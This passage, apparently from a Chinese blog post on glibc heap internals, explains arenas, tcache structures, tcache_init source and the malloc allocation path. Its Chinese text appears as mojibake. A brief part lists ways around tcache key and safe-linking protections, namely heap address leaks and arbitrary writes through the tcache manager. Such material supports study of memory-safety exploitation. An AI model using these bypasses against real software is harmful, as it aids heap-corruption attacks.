arenaè¿”å›ç»™ç”¨æˆ·ï¼Œå³è¡¨ç¤ºè¯¥arenaè¢«çº¿ç¨‹3å…±äº«ä½¿ç”¨ã€‚</p><p>2)è€Œå¦‚æœæ²¡èƒ½æ‰¾åˆ°å¯ç”¨çš„arenaï¼Œé‚£ä¹ˆå°±å°†çº¿ç¨‹3çš„mallocæ“ä½œé˜»å¡ï¼Œç›´åˆ°æœ‰å¯ç”¨çš„arenaä¸ºæ­¢ã€‚</p><p>3)ç°åœ¨ï¼Œå¦‚æœçº¿ç¨‹3å†æ¬¡è°ƒç”¨mallocçš„è¯ï¼Œglibc mallocå°±ä¼šå…ˆå°è¯•ä½¿ç”¨æœ€è¿‘è®¿é—®çš„arena(æ­¤æ—¶ä¸ºmain arena)ã€‚å¦‚æœæ­¤æ—¶main arenaå¯ç”¨çš„è¯ï¼Œå°±ç›´æ¥ä½¿ç”¨ï¼Œå¦åˆ™å°±å°†çº¿ç¨‹3é˜»å¡ï¼Œç›´åˆ°main arenaå†æ¬¡å¯ç”¨ä¸ºæ­¢ã€‚</p><p>è¿™æ ·çº¿ç¨‹3ä¸ä¸»çº¿ç¨‹å°±å…±äº«main arenaäº†ã€‚è‡³äºå…¶ä»–æ›´å¤æ‚çš„æƒ…å†µï¼Œä»¥æ­¤ç±»æ¨ã€‚</p><p><img src="/assets/Pasted%20image%2020241208111115.png"></p><p><img src="/assets/Pasted%20image%2020241208111123.png"></p><h2 id="tcacheæœºåˆ¶"><a href="#tcacheæœºåˆ¶" class="headerlink" title="tcacheæœºåˆ¶"></a>tcacheæœºåˆ¶</h2><p><code>tcache</code>Â æ˜¯ glibc 2.26 (ubuntu 17.10) ä¹‹åå¼•å…¥çš„ä¸€ç§æŠ€æœ¯ï¼Œç›®çš„æ˜¯æå‡å †ç®¡ç†çš„æ€§èƒ½ï¼Œä¸<code>fast bin</code>ç±»ä¼¼ã€‚<code>tcache</code>Â å¼•å…¥äº†ä¸¤ä¸ªæ–°çš„ç»“æ„ä½“ï¼Œ<code>tcache_entry</code>Â å’ŒÂ <code>tcache_perthread_struct</code>Â ã€‚</p><p><code>tcache_entry</code>Â å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span>Â <span class="hljs-class"><span class="hljs-keyword">struct</span>Â <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>Â Â <span class="hljs-class"><span class="hljs-keyword">struct</span>Â <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure><p><code>tcache_entry</code>Â ç”¨äºé“¾æ¥ç©ºé—²çš„<code>chunk</code>ç»“æ„ä½“ï¼Œå…¶ä¸­çš„<code>next</code>æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªå¤§å°ç›¸åŒçš„<code>chunk</code>ã€‚éœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œçš„<code>next</code>æŒ‡å‘<code>chunk</code>çš„<code>user data</code>ï¼Œè€Œ<code>fast bin</code>çš„<code>fd</code>æŒ‡å‘<code>chunk</code>å¼€å¤´çš„åœ°å€ã€‚è€Œä¸”ï¼Œ<code>tcache_entry</code>Â ä¼šå¤ç”¨ç©ºé—²Â <code>chunk</code>Â çš„<code>user data</code>éƒ¨åˆ†ã€‚</p><p><code>tcache_perthread_struct</code>Â å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span>Â <span class="hljs-class"><span class="hljs-keyword">struct</span>Â <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>Â Â <span class="hljs-type">char</span>Â counts[TCACHE_MAX_BINS];<br>Â Â tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_MAX_BINSÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â  64</span><br><br><span class="hljs-type">static</span>Â __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure><p>å¯¹åº”ç»“æ„å¦‚ä¸‹</p><p><img src="/../assets/Pasted%20image%2020241105180409.png"><br>æ¯ä¸ª<code>thread</code>éƒ½ä¼šç»´æŠ¤ä¸€ä¸ªÂ <code>tcache_perthread_struct</code>Â ï¼Œå®ƒæ˜¯æ•´ä¸ªÂ <code>tcache</code>Â çš„ç®¡ç†ç»“æ„ï¼Œä¸€å…±æœ‰Â <code>TCACHE_MAX_BINS</code>Â ä¸ªè®¡æ•°å™¨å’ŒÂ <code>TCACHE_MAX_BINS</code>Â é¡¹Â <code>tcache_entry</code>ã€‚è¿™ä¸ªç»“æ„åœ¨Â <code>tcache_init</code>Â å‡½æ•°ä¸­è¢«åˆå§‹åŒ–åœ¨å †ä¸Šï¼Œå¤§å°ä¸º 0x250ï¼ˆé«˜ç‰ˆæœ¬ä¸º 0x290ï¼‰ã€‚å…¶ä¸­æ•°æ®éƒ¨åˆ†å‰ 0x40 ä¸ºÂ <code>counts</code>Â ï¼Œå‰©ä¸‹çš„ä¸ºÂ <code>entries</code>Â ç»“æ„ã€‚å¦‚æœèƒ½æ§åˆ¶è¿™ä¸ªå †å—å°±å¯ä»¥æ§åˆ¶æ•´ä¸ªÂ <code>tcache</code>Â ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span>Â <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>Â Â mstate ar_ptr;<br>Â Â <span class="hljs-type">void</span>Â *victim = <span class="hljs-number">0</span>;<br>Â Â <span class="hljs-type">const</span>Â <span class="hljs-type">size_t</span>Â bytes =Â <span class="hljs-keyword">sizeof</span>Â (tcache_perthread_struct);<br>Â Â <br>Â Â <span class="hljs-keyword">if</span>Â (tcache_shutting_down)<br>Â Â Â Â <span class="hljs-keyword">return</span>;<br><br>Â Â arena_get (ar_ptr, bytes);<br>Â Â victim = _int_malloc (ar_ptr, bytes);<br>Â Â <span class="hljs-keyword">if</span>Â (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>Â Â Â Â &#123;<br>Â Â Â Â Â Â ar_ptr = arena_get_retry (ar_ptr, bytes);<br>Â Â Â Â Â Â victim = _int_malloc (ar_ptr, bytes);<br>Â Â Â Â &#125;<br>Â Â Â Â <br>Â Â <span class="hljs-keyword">if</span>Â (ar_ptr != <span class="hljs-literal">NULL</span>)<br>Â Â Â Â __libc_lock_unlock (ar_ptr-&gt;mutex);<br><br>Â Â <span class="hljs-comment">/* In a low memory situation, we may not be able to allocate memory</span><br><span class="hljs-comment">Â Â Â Â Â - in which case, we just keep trying later.Â  However, we</span><br><span class="hljs-comment">Â Â Â Â Â typically do this very early, so either there is sufficient</span><br><span class="hljs-comment">Â Â Â Â Â memory, or there isn&#x27;t enough memory to do non-trivial</span><br><span class="hljs-comment">Â Â Â Â Â allocations anyway.Â  */</span><br><br>Â Â <span class="hljs-keyword">if</span>Â (victim)<br>Â Â Â Â &#123;<br>Â Â Â Â Â Â tcache = (tcache_perthread_struct *) victim;<br>Â Â Â Â Â Â <span class="hljs-built_in">memset</span>Â (tcache, <span class="hljs-number">0</span>,Â <span class="hljs-keyword">sizeof</span>Â (tcache_perthread_struct));<br>Â Â Â Â &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>tcache_perthread_struct</code>Â ä¸­çš„Â <code>tcache_entry</code>Â ç”¨å•å‘é“¾è¡¨çš„æ–¹å¼é“¾æ¥äº†ç›¸åŒå¤§å°çš„å¤„äºç©ºé—²çŠ¶æ€ï¼ˆ<code>free</code>Â åï¼‰çš„Â <code>chunk</code>ï¼Œè¿™ä¸€ç‚¹ä¸Šå’Œ fast bin å¾ˆåƒã€‚</p><p>å¦å¤–ä¸<code>fast bin</code>ç›¸åŒçš„æ˜¯é‡Šæ”¾è¿›å…¥Â <code>tcache</code>Â çš„Â <code>chunk</code>Â çš„ä¸‹ä¸€ä¸ªç›¸é‚»Â <code>chunk</code>Â çš„Â <code>PREV_INUSE</code>Â ä½ä¸æ¸…é›¶ã€‚</p><p><code>counts</code>Â è®°å½•äº†Â <code>tcache_entry</code>Â é“¾ä¸Šç©ºé—²Â <code>chunk</code>Â çš„æ•°ç›®ï¼Œæ¯æ¡é“¾ä¸Šæœ€å¤šå¯ä»¥æœ‰ 7 ä¸ªÂ <code>chunk</code>Â ã€‚æ³¨æ„æŒ‡é’ˆæŒ‡å‘çš„ä½ç½®æ˜¯Â <code>fd</code>Â æŒ‡é’ˆï¼Œè¿™ä¸€ç‚¹ä¸<code>fast bin</code>ä¸åŒã€‚<br>ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="/../assets/Pasted%20image%2020241105210106.png"></p><p>stash æœºåˆ¶ï¼š</p><p>å½“ç”³è¯·çš„å¤§å°åœ¨Â <code>tcache</code>Â èŒƒå›´çš„Â <code>chunk</code>Â åœ¨Â <code>tcache</code>Â ä¸­æ²¡æœ‰ï¼Œæ­¤æ—¶ ptmalloc ä¼šåœ¨å…¶ä»–Â <code>bin</code>Â é‡Œé¢æ‰¾ï¼Œå¦‚æœæ‰¾åˆ°äº†ä¼šå°†è¯¥Â <code>chunk</code>Â æ”¾åˆ°Â <code>tcache</code>Â ä¸­ï¼Œç›´åˆ°Â <code>tcache</code>Â å¡«æ»¡ï¼Œæœ€åç›´æ¥è¿”å›æ‰¾åˆ°çš„Â <code>chunk</code>Â æˆ–æ˜¯ä»Â <code>tcache</code>Â ä¸­å–å‡ºå¹¶è¿”å›ã€‚</p><p>å®‰å…¨æ£€æŸ¥ï¼š</p><ul><li>tcache keyï¼ˆonly libc2.29 and upï¼‰ï¼šè‡ª glibc2.29 ç‰ˆæœ¬èµ·Â <code>tcache</code>Â æ–°å¢äº†ä¸€ä¸ª key å­—æ®µï¼Œè¯¥å­—æ®µä½äºÂ <code>chunk</code>Â çš„ bk å­—æ®µï¼Œå€¼ä¸ºÂ <code>tcache</code>Â ç»“æ„ä½“çš„åœ°å€ï¼Œè‹¥Â <code>free()</code>Â æ£€æµ‹åˆ°Â <code>chunk-&gt;bk == tcache</code>Â åˆ™ä¼šéå†Â <code>tcache</code>Â æŸ¥æ‰¾å¯¹åº”é“¾è¡¨ä¸­æ˜¯å¦æœ‰è¯¥Â <code>chunk</code><br>  æœ€æ–°ç‰ˆæœ¬çš„ä¸€äº›è€ glibc ï¼ˆå¦‚æ–°ç‰ˆ2.27ç­‰ï¼‰ä¹Ÿå¼•å…¥äº†è¯¥é˜²æŠ¤æœºåˆ¶</li><li>Safe linking æœºåˆ¶ï¼ˆonly glibc2.32 and upï¼‰ï¼šä¸<code>fast bin</code>ç±»ä¼¼ã€‚<br>  ç»•è¿‡æ–¹æ³•ï¼š<ul><li>åœ¨Â <code>tcache</code>Â çš„ä¸€ä¸ªÂ <code>entry</code>Â ä¸­æ”¾å…¥ç¬¬ä¸€ä¸ªÂ <code>chunk</code>Â æ—¶ï¼Œå…¶åŒæ ·ä¼šå¯¹è¯¥Â <code>entry</code>Â ä¸­çš„ â€œ<code>chunk</code>â€ ï¼ˆNULLï¼‰è¿›è¡Œå¼‚æˆ–è¿ç®—åå†™å…¥åˆ°å°†æ”¾å…¥Â <code>tcache</code>Â ä¸­çš„Â <code>chunk</code>Â çš„Â <code>fd</code>Â å­—æ®µï¼Œè‹¥æ˜¯æˆ‘ä»¬èƒ½å¤Ÿæ‰“å°è¯¥ free chunk çš„Â <code>fd</code>Â å­—æ®µï¼Œä¾¿èƒ½å¤Ÿç›´æ¥è·å¾—æœªç»å¼‚æˆ–è¿ç®—çš„å †ä¸Šç›¸å…³åœ°å€ï¼ˆå³ç§» 12 ä½ï¼‰</li><li>åœ¨Â <code>tcache-&gt;entry</code>Â ä¸­å­˜æ”¾çš„ä»æ˜¯æœªç»åŠ å¯†è¿‡çš„åœ°å€ï¼Œè‹¥æ˜¯æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶Â <code>tcache</code>Â ç®¡ç†å™¨åˆ™ä»å¯ä»¥åœ¨ä¸çŸ¥é“å †ç›¸å…³åœ°å€æ—¶è¿›è¡Œä»»æ„åœ°å€å†™ã€‚</li></ul></li></ul><h2 id="åˆ†é…è¿‡ç¨‹"><a href="#åˆ†é…è¿‡ç¨‹" class="headerlink" title="åˆ†é…è¿‡ç¨‹"></a>åˆ†é…è¿‡ç¨‹</h2><ul><li>æˆ‘ä»¬è°ƒç”¨<code>malloc</code>å‡½æ•°åˆ†é…ä¸€å—å†…å­˜ç»™ä¸€ä¸ªæŒ‡é’ˆæ—¶ï¼Œå®é™…ä¸Šæˆ‘ä»¬æ˜¯è°ƒç”¨äº†<code>_libc_malloc</code>å‡½æ•°ã€‚</li><li>é¦–å…ˆä¼šåœ¨<code>_libc_malloc</code>å‡½æ•°ä¸­åˆ¤æ–­<code>__malloc_hook</code>å‡½æ•°æŒ‡é’ˆæ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºåˆ™è°ƒç”¨<code>__malloc_hook</code>å‡½æ•°æŒ‡é’ˆï¼ˆglibc2.34å·²åˆ é™¤ï¼‰ã€‚</li><li>å¦‚æœ<code>glibc</code>å­˜åœ¨<code>tcache</code>ä¸”æœ‰ç›¸åº”å¤§å°çš„<code>chunk</code>åˆ™å°†å…¶ä»<code>tcache</code>ä¸­å–å‡ºå¹¶è¿”å›ç»“æœã€‚</li><li>å¦‚æœæ²¡æœ‰<code>tcache</code>æˆ–å…¶ä¸­ä¸å­˜åœ¨ç›¸åº”çš„<code>chunk</code>ï¼Œåˆ™è°ƒç”¨<code>_int_malloc</code>å‡½æ•°ç”³è¯·å†…å­˜ã€‚<ul><li>é¦–å…ˆæŠŠç”³è¯·çš„å†…å­˜çš„å­—èŠ‚æ•°è½¬åŒ–ä¸º<code>chunk</code>çš„å¤§å°ã€‚</li><li>å¦‚æœ<code>arena</code>æœªåˆå§‹åŒ–ï¼Œåˆ™è°ƒç”¨<code>sysmalloc</code>å‘ç³»ç»Ÿç”³è¯·å†…å­˜ï¼Œç„¶åå°†è·å–çš„<code>chunk</code>è¿”å›ã€‚</li><li>å¦‚æœç”³è¯·çš„<code>chunk</code>å¤§å°ä¸è¶…è¿‡<code>fast bin</code>çš„æœ€å¤§å€¼ï¼Œåˆ™å°è¯•ä»å¯¹åº”çš„<code>fast bin</code>çš„å¤´éƒ¨è·å–<code>chunk</code>ã€‚åœ¨è·å–åˆ°<code>chunk</code>åï¼Œå¦‚æœå¯¹åº”çš„<code>fast bin</code>è¿˜æœ‰<code>chunk</code>å¹¶ä¸”å¤§å°åœ¨<code>tcache</code>èŒƒå›´å°±å°†å®ƒä»¬ä¾æ¬¡ä»å¤´ç»“ç‚¹å–å‡ºæ”¾åˆ°<code>tcache</code>ä¸­ï¼Œç›´åˆ°æŠŠ<code>tcache</code>å¡«æ»¡ã€‚æœ€åå°†ç”³è¯·åˆ°çš„<code>chunk</code>è¿”å›ã€‚</li><li>å¦‚æœç”³è¯·çš„<code>chunk</code>åœ¨<code>large bin</code>å¤§å°èŒƒå›´åˆ™è°ƒç”¨<code>malloc_consolidate</code>å‡½æ•°å°†<code>fast bin</code>ä¸­çš„<code>chunk</code>åˆå¹¶åæ”¾å…¥ <code>unsorted bin</code>ã€‚</li><li>å¾ªç¯è¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š<ul><li>å¾ªç¯å–<code>unsorted bin</code>æœ€åä¸€ä¸ª<code>chunk</code>ã€‚<ul><li>å¦‚æœç”¨æˆ·çš„è¯·æ±‚ä¸º<code>small bin chunk</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆè€ƒè™‘<code>last remainder</code>ï¼Œå¦‚æœå½“å‰<code>chunk</code>æ˜¯<code>last remainder</code>ï¼Œä¸”<code>last remainder</code>æ˜¯<code>unsorted bin</code>ä¸­çš„å”¯ä¸€ä¸€ä¸ª<code>chunk</code>ï¼Œå¹¶ä¸”<code>last remainder</code>çš„å¤§å°åˆ†å‰²åè¿˜å¯ä»¥ä½œä¸ºä¸€ä¸ª<code>chunk</code>ï¼Œåˆ™ä»<code>last remainder</code>ä¸­åˆ‡ä¸‹ä¸€å—å†…å­˜è¿”å›ã€‚</li><li>å¦‚æœ<code>chunk</code>çš„å¤§å°æ°å¥½ç­‰äºç”³è¯·çš„<code>chunk</code>å¤§å°ï¼Œåˆ™å¦‚æœè¯¥å†…å­˜å¤§å°åœ¨ tcache èŒƒå›´ä¸” tcache æ²¡æœ‰æ»¡ï¼Œåˆ™å…ˆå°†å…¶æ”¾å…¥<code>tcache</code>ï¼Œä¹‹åä¼šè€ƒè™‘ä»<code>tcache</code>ä¸­æ‰¾<code>chunk</code>ã€‚å¦åˆ™ç›´æ¥å°†æ‰¾åˆ°çš„<code>chunk</code>è¿”å›ã€‚</li><li>æ ¹æ®<code>chunk</code>çš„å¤§å°å°†å…¶æ”¾å…¥<code>small bin</code>æˆ–<code>large bin</code>ä¸­ã€‚å¯¹äº<code>small bin</code>ç›´æ¥ä»é“¾è¡¨å¤´éƒ¨åŠ å…¥ï¼›å¯¹äº <code>large bin</code>ï¼Œé¦–å…ˆç‰¹åˆ¤åŠ å…¥é“¾è¡¨å°¾éƒ¨çš„æƒ…å†µï¼Œå¦‚æœä¸åœ¨é“¾è¡¨å°¾éƒ¨åˆ™ä»å¤´éƒ¨éå†æ‰¾ä½ç½®ï¼Œå¦‚æœ<code>large bin</code>ä¸­æœ‰ä¸åŠ å…¥çš„<code>chunk</code>å¤§å°ç›¸åŒçš„<code>chunk</code>ï¼Œåˆ™åŠ å…¥åˆ°ç¬¬ä¸€ä¸ªç›¸ç­‰<code>chunk</code>åé¢ï¼Œå¦åˆ™åŠ åˆ°åˆé€‚ä½ç½®åè¿˜éœ€è¦æ›´æ–° nextsize æŒ‡é’ˆã€‚</li><li>å°è¯•ä»<code>tcache</code>æ‰¾<code>chunk</code>ã€‚</li><li>å¦‚æœå¾ªç¯è¶…è¿‡ 10000 æ¬¡å°±è·³å‡ºå¾ªç¯ã€‚</li></ul></li><li>å°è¯•ä»<code>tcache</code>æ‰¾<code>chunk</code>ã€‚</li><li>å¦‚æœç”³è¯·<code>chunk</code>å¤§å°ä¸åœ¨<code>small bin</code>èŒƒå›´ï¼Œåˆ™ä»åå¾€å‰éå†å¯¹åº”<code>large bin</code>ï¼Œæ‰¾åˆ°ç¬¬ä¸€ä¸ªä¸å°äºç”³è¯· chunk å¤§å°çš„ chunkã€‚ä¸ºäº† unlink æ—¶é¿å…ä¿®æ”¹ nextsize çš„æ“ä½œï¼Œå¦‚æœå­˜åœ¨å¤šä¸ªåˆé€‚çš„ chunk åˆ™é€‰æ‹©ç¬¬äºŒä¸ª chunkã€‚å¦‚æœé€‰å–çš„ chunk æ¯”ç”³è¯·çš„ chunk å¤§ä¸å°‘äº MINSIZEï¼Œåˆ™éœ€è¦å°†å¤šå‡ºæ¥çš„éƒ¨åˆ†åˆ‡å‡ºæ¥ä½œä¸º <code>remainder</code>ï¼Œå¹¶å°†å…¶åŠ å…¥<code>unsorted bin</code>å¤´éƒ¨ã€‚ç„¶åå°†è·å–çš„<code>chunk</code>è¿”å›ã€‚</li><li>æ‰¾ä¸€ä¸ª<code>chunk</code>èŒƒå›´æ¯”ç”³è¯·<code>chunk</code>å¤§çš„éç©º<code>bin</code>é‡Œé¢æ‰¾æœ€åä¸€ä¸ª<code>chunk</code>ï¼Œè¿™ä¸ªè¿‡ç¨‹ç”¨ binmap ä¼˜åŒ–ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥æ›´æ–° <code>binmap</code> çš„çŠ¶æ€ã€‚è¿™ä¸ª<code>chunk</code>ä¸Šåˆ‡ä¸‹æ‰€éœ€çš„<code>chunk</code>ï¼Œå‰©ä½™éƒ¨åˆ†æ”¾å…¥<code>unsorted bin</code>å¤´éƒ¨ã€‚ç„¶åå°†è·å–çš„<code>chunk</code>è¿”å›ã€‚</li><li>å¦‚æœ<code>top chunk</code>åˆ‡ä¸‹æ‰€éœ€<code>chunk</code>åå‰©ä½™éƒ¨åˆ†è¿˜æ˜¯ä¸å°äº <code>MINSIZE</code> åˆ™ä»<code>top chunk</code>ä¸Šåˆ‡ä¸‹æ‰€éœ€ <code>chunk</code> è¿”å›ã€‚</li><li>å¦‚æœ<code>fast bins</code>è¿˜æœ‰<code>chunk</code>åˆ™è°ƒç”¨<code>malloc_consolidate</code>åˆå¹¶<code>fast bin</code>ä¸­çš„<code>chunk</code>å¹¶æ”¾å…¥<code>unsorted bin</code>ä¸­ï¼Œç„¶åç»§ç»­å¾ªç¯ã€‚</li><li>å¦‚æœ<code>fast bins</code>è¿˜æœ‰<code>chunk</code>åˆ™è°ƒç”¨<code>malloc_consolidate</code>åˆå¹¶<code>fast bin</code>ä¸­çš„<code>chunk</code>å¹¶æ”¾å…¥ <code>unsorted bin</code>ä¸­ï¼Œç„¶åç»§ç»­å¾ªç¯ã€‚</li><li>æœ€å<code>sysmalloc</code>ç³»ç»Ÿè°ƒç”¨å‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜åˆ†é…<code>chunk</code>ã€‚<ul><li>å¦‚æœ<code>arena</code>æ²¡æœ‰åˆå§‹åŒ–æˆ–è€…ç”³è¯·çš„å†…å­˜å¤§äº<code>mp_.mmap_threshold</code>ï¼Œå¹¶ä¸”<code>mmap</code>çš„æ¬¡æ•°å°äºæœ€å¤§å€¼ï¼Œåˆ™ä½¿ç”¨<code>mmap</code>ç”³è¯·å†…å­˜ã€‚ç„¶åæ£€æŸ¥ä¸€ä¸‹æ˜¯å¦16å­—èŠ‚å¯¹é½ç„¶åæ›´æ–°<code>mmap</code>æ¬¡æ•°å’Œ<code>mmap</code>ç”³è¯·è¿‡çš„æœ€å¤§å†…å­˜å¤§å°åå°±å°†<code>chunk</code>è¿”å›ã€‚</li><li>å¦‚æœ<code>arena</code>æ²¡æœ‰åˆå§‹åŒ–å°±è¿”å›0ã€‚</li><li>å¯¹ä¹‹å‰çš„<code>top chunk</code>è¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æœæ˜¯ dummy topçš„è¯ï¼Œå› ä¸ºæ˜¯ç”¨<code>unsorted bin</code>è¡¨ç¤ºçš„ï¼Œå› æ­¤ top chunk çš„å¤§å°éœ€è¦æ˜¯0ã€‚å¦åˆ™å †çš„å¤§å°åº”è¯¥ä¸å°äº MINSIZE ï¼Œå¹¶ä¸”å‰ä¸€ä¸ªå †å—ä¸€ä¸ªå¤„äºä½¿ç”¨ä¸­ï¼Œå¹¶ä¸”å †çš„ç»“æŸåœ°å€åº”è¯¥æ˜¯é¡µå¯¹é½çš„ï¼Œç”±äºé¡µå¯¹é½çš„å¤§å°é»˜è®¤æ˜¯ 0x1000ï¼Œæ‰€ä»¥ä½ 12 ä¸ªæ¯”ç‰¹éœ€è¦ä¸º0.åˆæ¬¡ä¹‹å¤–ï¼Œ<code>top chunk</code>å¤§å°å¿…é¡»æ¯”ç”³è¯·<code>chunk</code>å¤§å°åŠ ä¸Š MINSIZE è¦å°ã€‚</li><li>å¦‚æœ<code>arena</code>ä¸æ˜¯<code>main_arena</code><ul><li>å°è¯•å°†<code>top chunk</code>æ‰€åœ¨çš„<code>heap</code>æ‰©å±•å¤§å°ï¼Œå¦‚æœæˆåŠŸåˆ™æ›´æ–°<code>arena</code>è®°å½•çš„å†…å­˜æ€»å¤§å° <code>system_mem</code>å’Œ<code>top chunk</code>å¤§å°ã€‚</li><li>å°è¯•ç”³è¯·ä¸€ä¸ªæ–°çš„<code>heap</code>ã€‚è®¾ç½®æ–°çš„<code>heap</code>ä»¥åŠ<code>arena</code>çš„å‚æ•°å¹¶ä¸”å°†åŸæ¥çš„<code>top chunk</code>å…ˆä»å°¾éƒ¨åˆ‡ä¸‹ 2 ä¸ª0x10å¤§å°çš„<code>chunk</code>ï¼Œå‰©ä½™éƒ¨åˆ†å¦‚æœä¸å°äº MINSIZE åˆ™å°†å…¶é‡Šæ”¾æ‰ã€‚</li><li>å¦åˆ™ï¼Œå¦‚æœå‰é¢æ²¡æœ‰æ‰§è¡Œåˆ°<code>mmap</code>ç”³è¯·<code>chunk</code>çš„åˆ†æ”¯å°±å°è¯•æ‰§è¡Œã€‚</li></ul></li><li>å¦‚æœ<code>arena</code>æ˜¯ <code>main arena</code><ul><li>è®¡ç®—éœ€è¦è·å–çš„å†…å­˜å¤§å°ã€‚éœ€è¦è·å–çš„å†…å­˜å¤§å°ç­‰äºç”³è¯·çš„<code>chunk</code>å¤§å°åŠ ä¸Š0x20000å’ŒMINSIZEã€‚å¦‚æœå †ç©ºé—´è¿ç»­ï¼Œåˆ™å¯ä»¥å†å‡å»åŸæ¥å†…å­˜çš„å¤§å°ã€‚ç„¶åå°†éœ€è¦è·å–çš„å†…å­˜å¤§å°ä¸é¡µå¯¹é½ã€‚</li><li><code>sbrk</code>æ‰©å±•å†…å­˜å¦‚æœæˆåŠŸåˆ™ä¼šå°è¯•è°ƒç”¨ä¸€ä¸ª hook å‡½æ•°ï¼Œå¦åˆ™<code>mmap</code>ç”³è¯·å†…å­˜ï¼Œç„¶å<code>brk</code>ç§»åˆ°ç”³è¯·çš„å†…å­˜å¤„å¹¶è®¾ç½®å †ä¸è¿ç»­å‚æ•°ã€‚</li><li>å¦‚æœæˆåŠŸè·å–åˆ°å†…å­˜ï¼Œåˆ™æ›´æ–°<code>arena</code>è®°å½•çš„å†…å­˜æ€»å¤§å°<code>system_mem</code>å’Œ<code>sbrk_base</code>ã€‚ä¹‹åå¯¹ä¸€ç³»åˆ—çš„æƒ…å†µè¿›è¡Œå¤„ç†ï¼Œåœ¨è¿™æœŸé—´ï¼Œä¹‹å‰çš„<code>top chunk</code>ä¼šè¢«ä»å°¾éƒ¨åˆ‡ä¸‹ä¸¤ä¸ª 0x10 å¤§å°çš„<code>chunk</code>ï¼Œå‰©ä½™éƒ¨åˆ†å¦‚æœä¸å°äº<code>MINSIZE</code>åˆ™å°†å…¶é‡Šæ”¾æ‰ã€‚</li></ul></li><li>æœ€åä»æ–°è·å–çš„<code>top chunk</code>åˆ‡ä¸‹æ‰€éœ€çš„<code>chunk</code>å¹¶è¿”å›ã€‚</li></ul></li></ul></li></ul></li></ul><h2 id="mallocæºç åˆ†æ"><a href="#mallocæºç åˆ†æ" class="headerlink" title="mallocæºç åˆ†æ"></a>mallocæºç åˆ†æ</h2><p>å¦‚æœå‰ä¸€ä¸ª chunk å¤„äºä½¿ç”¨çŠ¶æ€ï¼Œé‚£ä¹ˆä¸éœ€è¦å»é€šè¿‡é“¾è¡¨ä¸²èµ·æ¥ï¼Œæ‰€ä»¥å½“å‰ chunk ä¹Ÿå°±ä¸éœ€è¦ prev_sizeï¼Œå½“ç”³è¯·çš„å†…å­˜å¤§å°å¯¹ 2 * size_t å–ä½™ä¹‹åæ¯” size_t å°äºç­‰äºçš„è¯å°±å¯ä»¥ç”¨å®ƒçš„ä¸‹ä¸€ä¸ª chunk çš„ prev_size</p><p>è¿˜æ˜¯ 64 ä½ä¸‹ï¼Œå¦‚æœå¤§å°æ˜¯ 0x49 çš„è¯å–ä½™ä¹‹åè¿˜å·® 0x5ï¼Œé‚£å°±æ²¡æ³•ç”¨äº†ï¼Œåªèƒ½å¤šç”³è¯·ä¸€å—ï¼Œæœ€ååŠ ä¸Š chunk header ç”¨äº† 0x60</p><p>å†…å­˜å¯¹é½</p><table><thead><tr><th>æœºå™¨ç±»å‹</th><th>64ä½</th><th>32ä½</th></tr></thead><tbody><tr><td>å¯¹é½ä½æ•°</td><td>16</td><td>8</td></tr><tr><td>size_t</td><td>8</td><td>4</td></tr></tbody></table><h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a><code>__libc_malloc</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 